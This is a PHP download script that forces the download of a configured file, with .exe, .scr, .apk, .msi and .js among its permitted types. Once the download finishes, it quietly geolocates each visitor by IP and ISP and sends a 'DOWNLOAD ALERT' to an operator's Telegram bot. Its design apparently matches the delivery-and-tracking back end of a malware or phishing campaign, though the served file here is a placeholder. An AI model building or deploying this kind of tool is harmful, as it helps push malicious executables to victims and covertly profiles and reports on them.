<?php
// Disable display of errors to users
ini_set('display_errors', 0);
ini_set('log_errors', 1);
ini_set('error_log', 'error_log.txt');

// Prevent script from being killed during long download
set_time_limit(0);
ignore_user_abort(true);

// Output buffering cleanup
if (ini_get('zlib.output_compression')) {
    ini_set('zlib.output_compression', 'Off');
}
while (ob_get_level()) {
    ob_end_clean();
}
ob_start();

// Get client IP
function getClientIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) return filter_var($_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP);
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return filter_var(explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0], FILTER_VALIDATE_IP);
    return $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
}

// Detect device type
function detectDevice($ua) {
    if (stripos($ua, 'iPhone') !== false) return 'iPhone';
    if (stripos($ua, 'iPad') !== false) return 'iPad';
    if (stripos($ua, 'Android') !== false) return 'Android';
    if (stripos($ua, 'Mobile') !== false) return 'Mobile';
    return 'Desktop';
}

// Detect browser
function detectBrowser($ua) {
    if (stripos($ua, 'Edge') !== false) return 'Edge';
    if (stripos($ua, 'Chrome') !== false) return 'Chrome';
    if (stripos($ua, 'Firefox') !== false) return 'Firefox';
    if (stripos($ua, 'Safari') !== false && stripos($ua, 'Chrome') === false) return 'Safari';
    return 'Other';
}

// Telegram logger (with short timeout so it doesn't block download)
function sendTelegramMessage($message) {
    $settings = file_exists('settings.php') ? include 'settings.php' : [];
    if (!empty($settings['telegram']) && $settings['telegram'] === "1" &&
        !empty($settings['bot_url']) && !empty($settings['chat_id'])) {
        $payload = [
            'chat_id' => $settings['chat_id'],
            'text' => $message,
            'parse_mode' => 'HTML'
        ];
        $opts = ['http' => [
            'method' => 'POST',
            'header' => 'Content-Type: application/x-www-form-urlencoded',
            'content' => http_build_query($payload),
            'timeout' => 3
        ]];
        @file_get_contents("https://api.telegram.org/{$settings['bot_url']}/sendMessage", false, stream_context_create($opts));
    }
}

// Start processing - do NOT block with geo/telegram yet
$settings = include __DIR__ . '/settings.php';
$ip = getClientIP();
$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
$device = detectDevice($ua);
$browser = detectBrowser($ua);
$type = $_GET['type'] ?? 'unknown';
$requestedFile = basename($settings['download_filename']);
$filePath = __DIR__ . '/files/' . $requestedFile;

// Check extension
$allowed = ['exe', 'pdf', 'zip', 'docx', 'xlsx', 'txt', 'apk', 'msi', 'scr', 'js'];
$ext = strtolower(pathinfo($filePath, PATHINFO_EXTENSION));
if (!in_array($ext, $allowed)) {
    http_response_code(403);
    exit('Forbidden file type.');
}

// Create dummy file if not exists
if (!file_exists($filePath)) {
    if (!is_dir(__DIR__ . '/files')) mkdir(__DIR__ . '/files', 0755, true);
    file_put_contents($filePath, "This is a placeholder for {$requestedFile}");
}

// MIME type fallback
$mimeTypes = [
    'scr'  => 'application/octet-stream',
    'exe'  => 'application/octet-stream',
    'apk'  => 'application/vnd.android.package-archive',
    'zip'  => 'application/zip',
    'pdf'  => 'application/pdf',
    'docx' => 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
    'xlsx' => 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
    'txt'  => 'text/plain',
    'msi'  => 'application/octet-stream',
    'js'   => 'application/javascript'  // New JavaScript MIME type
];
$contentType = $mimeTypes[$ext] ?? 'application/octet-stream';

// ----- SEND FILE FIRST so download never gets cut -----
header('Content-Description: File Transfer');
header('Content-Type: ' . $contentType);
header('Content-Disposition: attachment; filename="' . basename($requestedFile) . '"');
header('Content-Transfer-Encoding: binary');
header('Expires: 0');
header('Cache-Control: must-revalidate');
header('Pragma: public');
header('Content-Length: ' . filesize($filePath));
ob_end_flush();
flush();
readfile($filePath);
flush();

// Close connection to client so they have the full file; then do slow logging
if (function_exists('fastcgi_finish_request')) {
    fastcgi_finish_request();
}

// Now do geo/log/telegram (won't affect download - client already received file)
$city = $country = $isp = "Unknown";
try {
    $ctx = stream_context_create(['http' => ['timeout' => 2]]);
    $loc = @file_get_contents("http://ip-api.com/json/" . $ip, false, $ctx);
    if ($loc) {
        $geo = json_decode($loc, true);
        if (!empty($geo['status']) && $geo['status'] === 'success') {
            $city = $geo['city'] ?? 'Unknown';
            $country = $geo['country'] ?? 'Unknown';
            $isp = $geo['isp'] ?? 'Unknown';
        }
    }
} catch (Exception $e) {
    error_log("GeoIP error: " . $e->getMessage());
}

$msg = "🚨 <b>DOWNLOAD ALERT</b>\n\n";
$msg .= "📁 File: <b>{$requestedFile}</b>\n";
$msg .= "📱 Device: {$device}\n";
$msg .= "🌐 Browser: {$browser}\n";
$msg .= "📍 Location: {$city}, {$country}\n";
$msg .= "🧭 ISP: {$isp}\n";
$msg .= "🕒 Time: " . date("Y-m-d H:i:s") . "\n";
$msg .= "🔗 Type: {$type}\n";
$msg .= "🔒 IP: {$ip}";
sendTelegramMessage($msg);
@file_put_contents('downloads.log', date("Y-m-d H:i:s") . " | {$ip} | {$country}/{$city} | {$browser} | {$device} | {$requestedFile}\n", FILE_APPEND);
exit;
?>
